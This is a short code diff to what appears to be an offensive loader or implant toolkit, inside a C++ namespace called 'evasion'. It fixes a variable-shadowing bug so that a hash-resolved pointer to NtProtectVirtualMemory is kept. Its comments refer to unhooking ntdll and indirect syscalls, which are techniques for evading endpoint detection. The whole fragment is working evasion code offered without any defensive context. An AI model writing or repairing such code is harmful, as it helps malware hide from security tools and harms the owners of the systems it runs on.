@@ -43,10 +43,17 @@ namespace evasion {
         // Fall back to the (post-unhook) hashed import if the indirect
         // path is unavailable. This covers the narrow window before
         // InitIndirectSyscalls runs and the "unhook failed" case.
+        //
+        // NOTE: ImportFunction() expands to `type name = (type)resolver(...)`,
+        // which would declare a NEW local `NtProtectVirtualMemory` shadowing
+        // the outer one and leaving that outer (still-NULL) slot unchanged.
+        // Fetch via GetProcAddressC directly so the outer variable receives
+        // the resolved pointer.
         if (!NtProtectVirtualMemory) {
             HMODULE ntdll = ImportModule("ntdll.dll");
             if (!ntdll) return FALSE;
-            ImportFunction(ntdll, NtProtectVirtualMemory, typeNtProtectVirtualMemory);
+            NtProtectVirtualMemory = (typeNtProtectVirtualMemory)
+                erebus::GetProcAddressC(ntdll, H("NtProtectVirtualMemory"));
             if (!NtProtectVirtualMemory) return FALSE;
         }
 
